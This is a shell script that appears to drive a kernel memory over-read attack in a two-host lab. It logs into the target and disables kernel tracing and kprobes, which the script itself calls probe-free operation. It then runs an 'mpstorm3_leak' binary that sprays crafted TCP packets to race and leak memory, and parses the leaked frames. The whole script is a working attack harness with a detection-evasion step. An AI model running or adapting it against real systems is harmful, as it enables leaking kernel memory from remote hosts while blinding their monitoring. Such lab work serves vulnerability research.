#!/bin/bash
# run_leak_noprobe.sh <race_sport> <spray_sport> <token> [runtime] [storm_spacing]
# Probe-free over-read harvest: no target-side kprobes/tracepoints.
# AF_PACKET captures only malformed-IHL SYN-ACKs (ihl > 5).
set -u
LAB=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
cd "$LAB"
RACE=${1:?}; SPRAY=${2:?}; TOK=${3:?}; RUNTIME=${4:-900}; SPACING=${5:-40}
./lab/ssh.sh target 'sudo sh -c "echo 0 > /sys/kernel/debug/tracing/tracing_on; echo 0 > /sys/kernel/debug/tracing/events/kprobes/enable 2>/dev/null; echo 0 > /sys/kernel/debug/tracing/events/kmem/kmalloc/enable 2>/dev/null; echo > /sys/kernel/debug/tracing/kprobe_events 2>/dev/null; echo > /sys/kernel/debug/tracing/trace; echo PROBES_OFF; cat /sys/kernel/debug/tracing/tracing_on"' >/dev/null 2>&1
./lab/ssh.sh attacker "timeout $((RUNTIME+90)) sudo FRAG_DUPS=1 SAVED_SYN_SPRAY=1 ACK_SPRAY=1 LEAK_DUMP=1 SPRAY_DPORT=9801 SPRAY_SRC=126.0.2.69 /tmp/mpstorm3_leak 9800 $TOK $RACE $RUNTIME $SPACING 3 $SPRAY 50 192.168.89.1 30000000 192.168.89.2 > /tmp/leak.out 2>&1; echo RC=\$?"
./lab/ssh.sh attacker 'echo -n frames=; grep -c "\[LEAK\]" /tmp/leak.out; python3 /tmp/parse_leak2.py; tail -3 /tmp/leak.out'
